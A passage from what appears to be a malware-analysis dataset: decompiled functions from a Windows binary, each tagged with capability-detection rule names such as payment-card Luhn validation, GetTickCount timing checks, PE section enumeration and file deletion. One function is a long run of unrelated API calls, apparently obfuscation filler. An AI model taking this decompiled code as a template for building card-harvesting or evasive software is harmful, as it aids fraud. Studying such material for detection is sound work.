        "decompiled_code": "\nvoid __cdecl fcn.00404a28(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t arg_14h;\n    int32_t iVar2;\n    int32_t arg_ch_00;\n    int32_t iVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x14) < arg_8h) {\n        fcn.0040584f();\n    }\n    uVar1 = *(in_ECX + 0x14) - arg_8h;\n    if (uVar1 < arg_ch) {\n        arg_ch = uVar1;\n    }\n    if (arg_ch != 0) {\n        arg_14h = uVar1 - arg_ch;\n        iVar2 = fcn.004046af();\n        iVar2 = iVar2 + arg_8h + arg_ch;\n        arg_ch_00 = *(in_ECX + 0x18) - arg_8h;\n        iVar3 = fcn.004046af();\n        fcn.0040499e(iVar3 + arg_8h, arg_ch_00, iVar2, arg_14h);\n        fcn.004048e7(*(in_ECX + 0x14) - arg_ch);\n    }\n    return;\n}\n",
        "token_count": 287
    },
    "00404d3b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404d3b(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint arg_ch_00;\n    uint32_t arg_14h;\n    \n    uVar2 = fcn.00404685();\n    if (uVar2 < arg_ch) {\n        fcn.0040584f();\n    }\n    iVar3 = fcn.00404685();\n    uVar2 = iVar3 - arg_ch;\n    if (arg_10h < iVar3 - arg_ch) {\n        uVar2 = arg_10h;\n    }\n    if (in_ECX == arg_8h) {\n        fcn.00404a28(uVar2 + arg_ch, 0xffffffff);\n        fcn.00404a28(0, arg_ch);\n    }\n    else {\n        cVar1 = fcn.00404c5b(uVar2, 0);\n        if (cVar1 != '\\0') {\n            arg_14h = uVar2;\n            iVar3 = fcn.004046af();\n            iVar3 = iVar3 + arg_ch;\n            arg_ch_00 = *(in_ECX + 0x18);\n            arg_8h_00 = fcn.004046af();\n            fcn.0040497a(arg_8h_00, arg_ch_00, iVar3, arg_14h);\n            fcn.004048e7(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 365
    },
    "00405088": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint * __cdecl fcn.00405088(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004062fc();\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00405925(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = 0x401624;\n    fcn.00404e70(arg_8h_00 + 0xc);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 246
    },
    "004050e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004050e6(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 0x1c) {\n        fcn.00404ebc(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "00405105": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405105(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 0x1c) {\n        fcn.00404eb3(arg_10h);\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "0040513c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040513c(uint32_t arg_8h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    \n    *(in_ECX + 0xc) = 0;\n    *(in_ECX + 0x10) = 0;\n    *(in_ECX + 0x14) = 0;\n    if (arg_8h == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar2 = fcn.0040490e();\n        if (uVar2 < arg_8h) {\n            fcn.0040504f();\n        }\n        iVar3 = fcn.00404916(arg_8h);\n        *(in_ECX + 0xc) = iVar3;\n        *(in_ECX + 0x10) = iVar3;\n        *(in_ECX + 0x14) = arg_8h * 0x1c + iVar3;\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 243
    },
    "004051b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004051b1(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_8h_00;\n    uint arg_10h_00;\n    \n    arg_10h_00 = arg_10h;\n    arg_ch_00 = fcn.004049c2(&arg_ch);\n    arg_8h_00 = fcn.004049c2(&arg_8h);\n    fcn.00405105(arg_8h_00, arg_ch_00, arg_10h_00);\n    return;\n}\n",
        "token_count": 135
    },
    "00405240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00405240(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint arg_10h)\n\n{\n    int32_t unaff_EBP;\n    int32_t arg_8h;\n    int32_t arg_ch;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h_2;\n    uint var_14h_2;\n    uint var_10h;\n    uint var_30h_2;\n    uint var_14h;\n    uint var_ch_2;\n    uint var_4h;\n    uint var_30h;\n    \n    fcn.004062fc();\n    arg_8h = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x10) = &stack0xffffffd0;\n    *(unaff_EBP + -0x14) = arg_8h;\n    fcn.00404c0c();\n    *(unaff_EBP + -4) = 0;\n    arg_ch = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 1;\n    for (; arg_ch != *(unaff_EBP + 0xc); arg_ch = arg_ch + 0x1c) {\n        fcn.00405123(arg_8h, unaff_EBP + -0x30);\n        fcn.0040512c(arg_8h, arg_ch);\n        arg_8h = arg_8h + 0x1c;\n        *(unaff_EBP + 0x10) = arg_8h;\n    }\n    fcn.00404c2d();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return arg_8h;\n}\n",
        "token_count": 466
    },
    "00405335": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405335(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    \n    fcn.00405186(arg_8h, arg_ch, in_ECX + 8);\n    return;\n}\n",
        "token_count": 56
    },
    "004053c6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004053c6(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint noname_3, uint arg_18h)\n\n{\n    uint arg_10h_00;\n    uint var_4h;\n    \n    arg_10h_00 = fcn.004049c2(&arg_10h);\n    fcn.004052cc(arg_8h, arg_ch, arg_10h_00);\n    return arg_10h + ((arg_ch - arg_8h) / 0x1c) * -0x1c;\n}\n",
        "token_count": 139
    },
    "00405447": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405447(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.0040534b(arg_8h, arg_ch, arg_10h, in_ECX + 8);\n    return arg_ch * 0x1c + arg_8h;\n}\n",
        "token_count": 87
    },
    "00405469": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405469(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.00405382(arg_8h, arg_ch, arg_10h, in_ECX + 8);\n    return;\n}\n",
        "token_count": 67
    },
    "00405482": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00405482(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint32_t noname_3;\n    uint arg_ch_00;\n    uint arg_8h_00;\n    uint arg_10h_00;\n    uint32_t var_9h;\n    uint var_5h;\n    uint var_1h;\n    \n    uVar1 = fcn.004048bb(&arg_10h);\n    var_9h = var_9h & 0xffffff00 | uVar1;\n    puVar2 = fcn.004048b3(&var_1h);\n    noname_3 = *puVar2;\n    arg_10h_00 = arg_10h;\n    arg_ch_00 = fcn.004049c2(&arg_ch);\n    arg_8h_00 = fcn.004049c2(&arg_8h);\n    fcn.004053c6(arg_8h_00, arg_ch_00, arg_10h_00, noname_3, var_9h);\n    return;\n}\n",
        "token_count": 276
    },
    "004054dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004054dd(uint *param_1)\n\n{\n    fcn.0040540c();\n    fcn.004046bd(*param_1);\n    return;\n}\n",
        "token_count": 42
    },
    "0040669e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040669e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040a6d0(0x417a98, 0xc);\n    if (*(unaff_EBP + 0xc) == 0) {\n        puVar1 = fcn.004070f7();\n        *puVar1 = 0x16;\n        fcn.00405e12(0, 0, 0, 0, 0);\n    }\n    else {\n        uVar2 = fcn.0040b244();\n        fcn.0040b35c(0, uVar2);\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.0040b244(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n        uVar2 = (**(unaff_EBP + 8))(uVar2);\n        *(unaff_EBP + -0x1c) = uVar2;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00406715();\n    }\n    fcn.0040a715();\n    return;\n}\n",
        "token_count": 340
    },
    "00406724": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406724(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0040669e(fcn.0040b4c3, arg_8h, 0, &arg_ch);\n    return;\n}\n",
        "token_count": 55
    },
    "00406741": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00406741(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint arg_10h;\n    uint var_4h;\n    \n    fcn.0040a6d0(0x417ab8, 0xc);\n    if (*(unaff_EBP + 8) == 0) {\n        puVar1 = fcn.004070f7();\n        *puVar1 = 0x16;\n        fcn.00405e12(0, 0, 0, 0, 0);\n    }\n    else {\n        iVar2 = fcn.0040b244();\n        fcn.0040b35c(1, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.0040b244();\n        arg_8h_00 = fcn.0040c480(iVar2 + 0x20);\n        iVar2 = unaff_EBP + 0xc;\n        arg_10h = 0;\n        uVar4 = *(unaff_EBP + 8);\n        iVar3 = fcn.0040b244();\n        uVar4 = fcn.0040c5f6(iVar3 + 0x20, uVar4, arg_10h, iVar2);\n        *(unaff_EBP + -0x1c) = uVar4;\n        iVar2 = fcn.0040b244();\n        fcn.0040c51c(arg_8h_00, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.004067dd();\n    }\n    fcn.0040a715();\n    return;\n}\n",
        "token_count": 467
    },
    "004067dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004067dd(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040b244();\n    fcn.0040b3ca(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 55
    },
    "0040ab5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ab5c(uint arg_8h)\n\n{\n    fcn.0040aa30(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 42
    },
    "0040dbbf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040dbd3)\n// WARNING: Removing unreachable block (ram,0x0040dbd9)\n// WARNING: Removing unreachable block (ram,0x0040dbdb)\n\nvoid fcn.0040dbbf(void)\n\n{\n    return;\n}\n",
        "token_count": 66
    },
    "00404f03": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00404f03(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t arg_8h_00;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_28h;\n    uint var_1ch;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004062fc();\n    iVar1 = *(unaff_EBP + 8);\n    if (arg_8h_00 != iVar1) {\n        cVar3 = fcn.004048d0(arg_8h_00, iVar1);\n        if (cVar3 == '\\0') {\n            fcn.00404e70(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            fcn.00404eb3(iVar1);\n            fcn.00404eb3(unaff_EBP + -0x28);\n            fcn.00404c2d();\n        }\n        else {\n            iVar1 = *(unaff_EBP + 8);\n            *(unaff_EBP + -0x1c) = *(arg_8h_00 + 4);\n            *(unaff_EBP + -0x18) = *(arg_8h_00 + 8);\n            *(unaff_EBP + -0x14) = *(arg_8h_00 + 0xc);\n            *(unaff_EBP + -0x10) = *(arg_8h_00 + 0x10);\n            *(arg_8h_00 + 4) = *(iVar1 + 4);\n            *(arg_8h_00 + 8) = *(iVar1 + 8);\n            *(arg_8h_00 + 0xc) = *(iVar1 + 0xc);\n            *(arg_8h_00 + 0x10) = *(iVar1 + 0x10);\n            *(iVar1 + 4) = *(unaff_EBP + -0x1c);\n            *(iVar1 + 8) = *(unaff_EBP + -0x18);\n            *(iVar1 + 0xc) = *(unaff_EBP + -0x14);\n            *(iVar1 + 0x10) = *(unaff_EBP + -0x10);\n            uVar2 = *(arg_8h_00 + 0x14);\n            *(arg_8h_00 + 0x14) = *(iVar1 + 0x14);\n            *(iVar1 + 0x14) = uVar2;\n            uVar2 = *(arg_8h_00 + 0x18);\n            *(arg_8h_00 + 0x18) = *(iVar1 + 0x18);\n            *(iVar1 + 0x18) = uVar2;\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 686
    },
    "004052cc": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004052cc(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    if (arg_8h != arg_ch) {\n        do {\n            arg_10h = arg_10h + -0x1c;\n            arg_ch = arg_ch + -0x1c;\n            fcn.0040512c(arg_10h, arg_ch);\n        } while (arg_ch != arg_8h);\n    }\n    return arg_10h;\n}\n",
        "token_count": 118
    },
    "00405776": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405776(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint *puVar4;\n    int32_t in_ECX;\n    uint var_10h;\n    uint var_8h;\n    \n    uVar1 = fcn.00404689();\n    uVar2 = fcn.0040469f();\n    if (uVar2 < uVar1) {\n        uVar3 = fcn.00405447(*(in_ECX + 0x10), 1, arg_8h);\n        *(in_ECX + 0x10) = uVar3;\n    }\n    else {\n        puVar4 = fcn.00404dc1(&var_8h);\n        fcn.00405719(&var_10h, *puVar4, puVar4[1], arg_8h);\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "004038d0": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpFilePart\n// WARNING: Variable defined which should be unmapped: lpNumberOfEventsRead\n\nvoid __cdecl fcn.004038d0(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uchar auStack10276 [2048];\n    uchar auStack8228 [1024];\n    uint var_1c20h;\n    uint lpszVolumeMountPoint;\n    uint lpBuffer;\n    uint var_820h;\n    uint lpOutBuffer;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uchar *puStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint *puStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint *puStack144;\n    uint uStack140;\n    uint *puStack136;\n    uint uStack132;\n    uint *puStack128;\n    uint uStack124;\n    uint *puStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint *puStack68;\n    uint uStack64;\n    uint *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint lpBytesRead;\n    uint lpNumberOfEventsRead;\n    uint lpFilePart;\n    \n    lpFilePart = 0x4038dd;\n    fcn.00405cb0();\n    if (*0x5d6394 == 0x37) {\n        lpBytesRead = 0;\n        uStack20 = 0;\n        uStack24 = 0;\n        uStack28 = 0x4038f7;\n        (*_sym.imp.KERNEL32.dll_CommConfigDialogA)();\n        uStack28 = 0;\n        uStack32 = 0;\n        var_20h = 0;\n        uStack40 = 0;\n        uStack44 = 0x403901;\n        (*_sym.imp.KERNEL32.dll_CreateMailslotW)();\n        uStack44 = 0;\n        puStack48 = 0x403908;\n        (*_sym.imp.KERNEL32.dll_GetDriveTypeW)();\n        puStack48 = &stack0xffffdfdc;\n        uStack52 = 0;\n        uStack56 = 0x403916;\n        (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryA)();\n        uStack56 = 0;\n        puStack60 = &fcn.004038d0::lpBytesRead;\n        uStack64 = 0;\n        puStack68 = &fcn.004038d0::lpOutBuffer;\n        uStack72 = 0;\n        uStack76 = 0;\n        uStack80 = 0x401344;\n        uStack84 = 0x403930;\n        (*_sym.imp.KERNEL32.dll_CallNamedPipeW)();\n        uStack84 = 0;\n        uStack88 = 0;\n        puStack92 = 0x403938;\n        (*_sym.imp.KERNEL32.dll_MoveFileA)();\n        puStack92 = &fcn.004038d0::lpFilePart;\n        puStack96 = &fcn.004038d0::lpBuffer;\n        uStack100 = 0;\n        uStack104 = 0;\n        uStack108 = 0;\n        uStack112 = 0;\n        uStack116 = 0x40394d;\n        (*_sym.imp.KERNEL32.dll_SearchPathW)();\n        uStack116 = 0;\n        puStack120 = &fcn.004038d0::lpszVolumeMountPoint;\n        uStack124 = 0;\n        puStack128 = 0x40395c;\n        (*_sym.imp.KERNEL32.dll_FindNextVolumeMountPointA)();\n        puStack128 = &fcn.004038d0::lpNumberOfEventsRead;\n        uStack132 = 0;\n        puStack136 = &fcn.004038d0::var_20h;\n        uStack140 = 0;\n        puStack144 = 0x40396c;\n        (*_sym.imp.KERNEL32.dll_ReadConsoleInputA)();\n        puStack144 = &fcn.004038d0::var_820h;\n        uStack148 = 0;\n        uStack152 = 0x40397a;\n        (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsA)();\n        uStack152 = 0;\n        uStack156 = 0;\n        uStack160 = 0;\n        uStack164 = 0x403983;\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryExW)();\n        uStack164 = 0;\n        puStack168 = &fcn.004038d0::var_1c20h;\n        uStack172 = 0;\n        uStack176 = 0x403992;\n        (*_sym.imp.KERNEL32.dll_FindFirstVolumeMountPointW)();\n        uStack176 = 0;\n        uStack180 = 0x403999;\n        (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        uStack180 = 0x40134c;\n        uStack184 = 0x4039a4;\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n        uStack184 = 0;\n        puStack188 = &stack0xffffd7dc;\n        uStack192 = 0x4039b2;\n        (*_sym.imp.KERNEL32.dll_GetSystemWindowsDirectoryW)();\n        uStack192 = 0x401354;\n        uStack196 = 0x4039bd;\n        (*_sym.imp.KERNEL32.dll_SetComputerNameA)();\n        pcVar1 = _sym.imp.KERNEL32.dll_CreateFileW;\n        uStack196 = 0;\n        uStack200 = 0;\n        uStack204 = 0;\n        uStack208 = 0;\n        uStack212 = 0;\n        uStack216 = 0;\n        uStack220 = 0x401360;\n        uStack224 = 0x4039d0;\n        (*_sym.imp.KERNEL32.dll_CreateFileW)();\n        uStack224 = 0;\n        uStack228 = 0;\n        uStack232 = 0;\n        uStack236 = 0x4039d9;\n        (*_sym.imp.KERNEL32.dll_AddConsoleAliasA)();\n        uStack236 = 0;\n        uStack240 = 0;\n        uStack244 = 0x4039e1;\n        (*_sym.imp.KERNEL32.dll_SetProcessPriorityBoost)();\n        uStack244 = 0;\n        uStack248 = 0;\n        uStack252 = 0;\n        uStack256 = 0;\n        uStack260 = 0x4039eb;\n        (*_sym.imp.KERNEL32.dll_EnumCalendarInfoExA)();\n        uStack260 = 0;\n        uStack264 = 0;\n        uStack268 = 0;\n        uStack272 = 0;\n        uStack276 = 0;\n        uStack280 = 0;\n        uStack284 = 0;\n        uStack288 = 0x4039f4;\n        (*pcVar1)();\n        uStack288 = 0x4039fa;\n        (*_sym.imp.KERNEL32.dll_SetFileApisToANSI)();\n        uStack288 = 0;\n        uStack292 = 0x40138c;\n        uStack296 = 0;\n        uStack300 = 0x4013b8;\n        uStack304 = 0;\n        uStack308 = 0;\n        uStack312 = 0x403a0e;\n        (*_sym.imp.KERNEL32.dll_CompareStringW)();\n    }\n    *(*0x5d5f40 + arg_8h) = *(*0x5d67a8 + 0x38d6 + arg_8h);\n    return;\n}\n",
        "token_count": 1992
    },
    "00415434": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.00415434(void)\n\n{\n    *0x5bd0c0 = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x40323c, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 65
    },
    "0040540c": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040540c(int32_t param_1)\n\n{\n    if (*(param_1 + 0xc) != 0) {\n        fcn.00405335(*(param_1 + 0xc), *(param_1 + 0x10));\n        fcn.004046bd(*(param_1 + 0xc));\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 127
    },
    "00406bcb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00406bcb(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040a6d0(0x417b00, 0xc);\n    fcn.00409bd6(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x5d67e0;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x5d67dc;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x00406c0f;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0040638f(arg_8h_00);\ncode_r0x00406c0f:\n        fcn.0040638f(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00406c32();\n    fcn.0040a715();\n    return;\n}\n",
        "token_count": 404
    },
    "0040666e": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040666e(uint lpFileName)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_DeleteFileA)(lpFileName);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (iVar1 != 0) {\n        fcn.0040711d(iVar1);\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 118
    }
}